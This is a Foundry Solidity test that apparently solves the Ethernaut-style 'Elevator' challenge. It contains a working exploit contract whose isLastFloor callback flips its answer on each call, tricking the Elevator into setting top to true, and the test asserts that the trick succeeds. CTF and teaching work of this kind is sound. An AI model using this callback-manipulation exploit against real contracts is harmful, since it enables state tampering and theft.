// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Elevator.sol";

contract BuildingInstance is Building {
    bool counter = true;

    function isLastFloor(uint256) external returns (bool) {
        counter = !counter;
        return counter;
    }

    function attack(Elevator elevator) public {
        elevator.goTo(1);
    }
}

contract ElevatorTest is Test {
    Elevator elevator;

    function setUp() public {
        elevator = new Elevator();
    }

    function test() public {
        assertEq(elevator.top(), false);

        BuildingInstance building = new BuildingInstance();
        building.attack(elevator);

        assertEq(elevator.top(), true);
    }
}
